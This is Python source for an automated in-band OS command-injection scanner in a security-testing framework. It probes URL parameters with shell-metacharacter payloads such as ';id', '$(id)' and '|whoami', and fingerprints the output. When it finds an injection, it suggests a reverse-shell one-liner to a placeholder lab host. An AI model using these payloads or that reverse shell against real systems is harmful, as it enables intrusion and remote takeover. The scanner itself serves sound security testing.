"""`scan_cmd_injection` — deterministic in-band command-injection
specialist (workitem.md Phase 2.6).

Closes CWE-78 (OS command injection) and CWE-77 (general command
injection). The blind variant (Phase 4.3) requires the OOB-DNS service
— this specialist covers the in-band cases where the command's stdout
is reflected in the response.

Detection strategy
------------------

For each candidate param, probe with a payload cohort that runs a
small, distinctive shell command (`id`, `uname -a`, `whoami`) using
shell metacharacters to escape the application's intended call:

  1. **Linux command-substitution** — `;id`, `|id`, `&&id`, backtick
     id, `$(id)`. Detection: response body contains `uid=NNN(`,
     `gid=NNN(`, `groups=`.

  2. **Windows command-substitution** — `&whoami`, `|whoami`. Detection:
     `\\` + alphanumeric (e.g. `IIS APPPOOL\\DefaultAppPool`,
     `nt authority\\system`).

  3. **Newline injection** — `%0aid`, `\\nid`. Detection: same
     fingerprints as above.

  4. **PowerShell** — `; whoami`. Detection: same windows fingerprint.

Output fingerprints are very specific (the format of `id` output is
extremely well-defined), so accidental matches are statistically
negligible.

Auto-emits CWE-78 finding on detection. Severity: critical (RCE).

Per-(endpoint, param) dedup so one finding per vulnerable surface.
"""

from __future__ import annotations

import logging
import re
from typing import Any
from urllib.parse import urlparse

from strix.tools.specialist.registry import register_specialist_tool
from strix.tools.specialist.result import (
    FindingDraft,
    SpecialistResult,
)


logger = logging.getLogger(__name__)


# (label, payload_suffix, fingerprint_regex, os_label)
# payload_suffix is appended to a benign baseline value (e.g. "test")
# so the original arg still parses but the trailing payload triggers
# command substitution.
_PROBES: tuple[tuple[str, str, str, str], ...] = (
    # ---------- Linux/Unix `id` ----------
    (
        "linux_semicolon_id",
        "test;id",
        # `id` output: uid=1000(name) gid=1000(name) groups=...
        r"uid=\d+\([\w-]+\)\s+gid=\d+\([\w-]+\)",
        "linux",
    ),
    (
        "linux_pipe_id",
        "test|id",
        r"uid=\d+\([\w-]+\)\s+gid=\d+\([\w-]+\)",
        "linux",
    ),
    (
        "linux_amp_amp_id",
        "test&&id",
        r"uid=\d+\([\w-]+\)\s+gid=\d+\([\w-]+\)",
        "linux",
    ),
    (
        "linux_backtick_id",
        "test`id`",
        r"uid=\d+\([\w-]+\)\s+gid=\d+\([\w-]+\)",
        "linux",
    ),
    (
        "linux_dollar_paren_id",
        "test$(id)",
        r"uid=\d+\([\w-]+\)\s+gid=\d+\([\w-]+\)",
        "linux",
    ),
    (
        "linux_newline_id",
        "test%0aid",
        r"uid=\d+\([\w-]+\)\s+gid=\d+\([\w-]+\)",
        "linux",
    ),
    # ---------- Linux uname (alt fingerprint) ----------
    (
        "linux_semicolon_uname",
        "test;uname -a",
        r"\b(Linux|Darwin)\s+\S+\s+\d+\.\d+",
        "linux",
    ),
    # ---------- Windows whoami ----------
    (
        "windows_amp_whoami",
        "test&whoami",
        r"(?:nt authority|iis apppool|administrator|builtin)\\\\?[\w-]+",
        "windows",
    ),
    (
        "windows_pipe_whoami",
        "test|whoami",
        r"(?:nt authority|iis apppool|administrator|builtin)\\\\?[\w-]+",
        "windows",
    ),
    (
        "windows_amp_dir",
        "test&dir",
        # `dir` output begins with " Volume in drive ..." or similar
        r"(?i)volume in drive [a-z] is|directory of [a-z]:\\\\",
        "windows",
    ),
)


def _build_url_with_param(
    url: str, param_name: str, value: str,
) -> str:
    """Substitute the named param in the URL's query string."""
    from urllib.parse import parse_qs, urlencode, urlunparse

    parts = urlparse(url)
    qs = parse_qs(parts.query, keep_blank_values=True)
    flat = {k: (v[0] if v else "") for k, v in qs.items()}
    flat[param_name] = value
    return urlunparse(
        parts._replace(query=urlencode(flat, doseq=False, safe=";|&`$()/")),
    )


def _emit_finding(
    *,
    url: str,
    param: str,
    payload_label: str,
    payload: str,
    response_excerpt: str,
    os_label: str,
) -> str | None:
    try:
        from strix.telemetry.tracer import get_global_tracer

        tracer = get_global_tracer()
        if tracer is None:
            return None
        finding_id = tracer.add_vulnerability_report(
            title=f"OS command injection in `{param}` parameter ({os_label})",
            severity="critical",
            cwe="CWE-78",
            endpoint=url,
            target=url,
            category="command_injection",
            verification_status="verified",
            confidence=0.97,
            description=(
                f"The `{param}` parameter at `{url}` is concatenated into "
                f"a shell command on the server. Probe `{payload_label}` "
                f"with payload `{payload}` returned content matching the "
                f"target command's output fingerprint, confirming OS "
                f"command injection."
            ),
            impact=(
                "Remote code execution. Attacker can run arbitrary "
                "shell commands on the server with the privileges of "
                "the web application process.\n"
                "  * Read every file the process can access "
                "    (`/etc/shadow`, app secrets, customer data).\n"
                "  * Pivot into the internal network.\n"
                "  * Persist via cron / systemd unit / reverse shell.\n"
                "  * On Windows, escalate via `whoami /priv` + token "
                "    impersonation.\n"
                "  * Full host compromise — this is the highest-"
                "    impact web vulnerability after authn bypass."
            ),
            technical_analysis=(
                f"Endpoint: {url}\n"
                f"Param: {param}\n"
                f"Probe: {payload_label}\n"
                f"Payload: {payload}\n"
                f"OS: {os_label}\n"
                f"Response excerpt:\n{response_excerpt[:1500]}\n"
                "Detection: response body matched the OS command's "
                "well-defined output format — `id` produces a "
                "specific `uid=NNN(name)` shape that is statistically "
                "negligible to appear by accident."
            ),
            poc_description=(
                f"1. Send GET request to {url} with `{param}` set to "
                f"`{payload}`.\n"
                f"2. The response body contains the output of the "
                f"injected command.\n"
                f"3. Pivot: replace `id` with a reverse shell, file "
                f"exfil command, or any other shell primitive."
            ),
            poc_script_code=(
                f"curl -sS -G '{url}' --data-urlencode '{param}={payload}'"
            ),
            remediation_steps=(
                "1. NEVER pass user input to a shell. Use the "
                "language's process-execution API with an argv list, "
                "not a shell string:\n"
                "     # Python — UNSAFE: subprocess.run(f'ping {host}',"
                " shell=True)\n"
                "     # Python — SAFE:   subprocess.run(['ping', host])\n"
                "2. If shell invocation is unavoidable, allowlist the "
                "input to a strict character set (e.g. `[a-zA-Z0-9.-]` "
                "for hostnames) and reject anything else server-side.\n"
                "3. Apply OS-level controls — run the web app as a "
                "low-privilege user inside a hardened container so a "
                "successful injection has minimal blast radius.\n"
                "4. Add WAF rules for shell metacharacter patterns "
                "(`;|&`$()<>`) as defence in depth — but NEVER as the "
                "primary defence."
            ),
            cvss_breakdown={
                "AV": "N", "AC": "L", "PR": "N", "UI": "N",
                "S": "C", "C": "H", "I": "H", "A": "H",
            },
            reasoning_trace=[
                f"Probed {param}= with command-injection payload `{payload_label}`.",
                f"Payload: {payload}",
                f"OS: {os_label}",
                "Response matched the command's output fingerprint — "
                "engine executed attacker-supplied shell.",
            ],
        )
        try:
            from strix.agents.kg_emit import record_finding_in_kg
            record_finding_in_kg(
                finding_id=finding_id, url=url, param=param,
                cwe="CWE-78", severity="critical", category="cmd_injection",
                method="GET", detection_kind=payload_label[:60],
                confidence=0.97,
            )
        except Exception as e:  # noqa: BLE001
            logger.debug("scan_cmd_injection: kg record failed: %s", e, exc_info=True)
        return finding_id
    except Exception as e:  # noqa: BLE001
        logger.debug("scan_cmd_injection: emit failed: %s", e, exc_info=True)
        return None


@register_specialist_tool(
    category="cmd-injection-specialist",
    llm=False,
    default_budget={"cost_usd": 0.0, "max_wall_seconds": 90},
    sandbox_execution=False,
    provenance="framework",
    mitre_techniques=["T1059", "T1190"],
)
def scan_cmd_injection(
    *,
    url: str,
    params: list[str] | str | None = None,
    param: str | None = None,
    other_params: dict[str, str] | None = None,
    extra_headers: dict[str, str] | None = None,
) -> SpecialistResult:
    """Deterministic in-band command-injection scanner.

    Args:
        url: target URL.
        params: param names to probe. When None, scanner infers from
            URL query keys + cmd-shape lexicon (`host`, `cmd`, `query`,
            `target`, `url`, `domain`, `ip`, `addr`, `ping`,
            `lookup`, `dns`, `command`, `exec`, ...).
        param: convenience alias for a single param name.
        other_params: ignored (preserved for signature parity).
        extra_headers: forwarded as-is.

    Auto-emits one finding per vulnerable (endpoint, param) pair.
    """
    if not isinstance(url, str) or not url.strip():
        return SpecialistResult(status="error", error="url required")
    url = url.strip()

    if param and not params:
        params = [param]
    if isinstance(params, str):
        params = [params]

    parsed = urlparse(url)
    if not params:
        from urllib.parse import parse_qs
        qs_keys = list(parse_qs(parsed.query).keys())
        # Param names that historically host cmd-injection bugs:
        # network utilities (ping, dig, nslookup), file ops,
        # admin actions.
        cmd_lexicon = {
            "host", "hostname", "addr", "ip", "domain", "target",
            "url", "ping", "lookup", "dns", "cmd", "command", "exec",
            "shell", "run", "execute", "query", "input", "data",
            "file", "filename", "path", "name",
        }
        params = [k for k in qs_keys if k.lower() in cmd_lexicon]
        if not params:
            params = qs_keys
    if not params:
        return SpecialistResult(
            status="partial",
            error="no cmd-shaped params found",
            evidence=[
                f"scan_cmd_injection invoked on {url!r}; supply "
                "`params=[...]` or include a query string with "
                "command-shaped params (e.g. `?host=`, `?cmd=`, "
                "`?ping=`, `?file=`)."
            ],
        )

    extra_headers = dict(extra_headers or {})
    if "Authorization" not in extra_headers and "authorization" not in {
        h.lower() for h in extra_headers
    }:
        try:
            from strix.agents.security_context import list_auth_states
            for state in list_auth_states():
                if state.bearer:
                    extra_headers["Authorization"] = f"Bearer {state.bearer}"
                    break
                if state.cookies:
                    extra_headers["Cookie"] = "; ".join(
                        f"{k}={v}" for k, v in state.cookies.items()
                    )
                    break
        except Exception:  # noqa: BLE001
            pass

    try:
        from strix.tools.proxy.proxy_manager import get_proxy_manager
        pm = get_proxy_manager()
    except Exception as e:  # noqa: BLE001
        return SpecialistResult(
            status="error",
            error=f"proxy_manager unavailable: {type(e).__name__}: {e}",
        )

    drafts: list[FindingDraft] = []
    evidence: list[str] = []
    emitted_count = 0
    probe_count = 0
    seen_endpoint_param: set[tuple[str, str]] = set()

    for raw_param in params:
        if not isinstance(raw_param, str) or not raw_param.strip():
            continue
        p = raw_param.strip()
        key = (parsed.path or "/", p)
        if key in seen_endpoint_param:
            continue

        for label, payload, fingerprint_re, os_label in _PROBES:
            probe_url = _build_url_with_param(url, p, payload)
            try:
                resp = pm.send_simple_request(
                    "GET", probe_url,
                    headers=extra_headers, body="", timeout=20,
                )
                probe_count += 1
            except Exception as e:  # noqa: BLE001
                evidence.append(f"transport error ({label}): {e}")
                continue
            if "error" in resp and not resp.get("status_code"):
                continue
            body = resp.get("body") or ""
            if not isinstance(body, str):
                continue
            m = re.search(fingerprint_re, body, re.IGNORECASE)
            if m:
                seen_endpoint_param.add(key)
                start = max(0, m.start() - 100)
                end = min(len(body), m.end() + 200)
                excerpt = body[start:end]
                rid = _emit_finding(
                    url=url, param=p, payload_label=label,
                    payload=payload, response_excerpt=excerpt,
                    os_label=os_label,
                )
                if rid:
                    emitted_count += 1
                drafts.append(FindingDraft(
                    title=f"OS command injection in `{p}` ({label})",
                    severity="critical", cwe="CWE-78",
                    endpoint=url, category="command_injection",
                    verification_status="verified", confidence=0.97,
                    description=(
                        f"Cmd injection: {label} → {payload} "
                        f"output fingerprint matched ({os_label})"
                    ),
                ))
                evidence.append(
                    f"cmd injection: {p}={payload} "
                    f"({label}, {os_label})"
                )
                break  # one finding per param

    # SecurityContext + decision_log
    try:
        from strix.agents.security_context import record_endpoint
        record_endpoint(url, method="GET", params=params, probed_for="command_injection")
    except Exception:  # noqa: BLE001
        pass
    try:
        from strix.agents.decision_log import record_decision
        record_decision(
            kind="specialist_invocation", target=url,
            actor={"tool_name": "scan_cmd_injection"},
            input={"params": list(params), "probes_sent": probe_count},
            output={"findings_emitted": emitted_count, "drafts": len(drafts)},
        )
    except Exception:  # noqa: BLE001
        pass

    return SpecialistResult(
        status="ok",
        findings=drafts,
        evidence=evidence[:50],
        next_probes_suggested=(
            ["confirm with reverse-shell payload (testing only): "
             "`bash -c 'bash -i >& /dev/tcp/<lab-host>/4444 0>&1'`; "
             "for blind variants Phase 4.3 OOB-DNS specialist"]
            if drafts else
            ["no in-band cmd injection detected; consider blind "
             "scan via OOB-DNS (Phase 4.3) — server may execute "
             "command but not echo stdout, or POST/JSON body fields"]
        ),
        tool_metadata={
            "probes_sent": probe_count,
            "params_probed": len(params),
            "findings_emitted_to_tracer": emitted_count,
        },
    )
